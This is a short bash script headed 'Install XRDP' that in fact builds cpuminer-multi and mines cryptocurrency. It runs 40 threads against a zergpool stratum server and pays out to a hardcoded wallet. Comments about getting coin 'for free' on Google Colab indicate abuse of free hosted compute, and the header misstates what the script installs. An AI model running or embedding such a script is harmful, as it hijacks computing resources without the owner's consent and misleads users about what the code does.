#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr

sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
sudo apt update
git clone https://github.com/litecoincash-project/cpuminer-multi miner
cd miner
./build.sh
./cpuminer -a minotaurx -o stratum+tcp://minotaurx.na.mine.zergpool.com:7019 -u TA7PJydbFEq8CazbRMvLNzhad1EBMfCPrY -p c=TRX,mc=MAZA,m=solo -t40 --cpu-affinity 0x000000FFFFFFFFFF

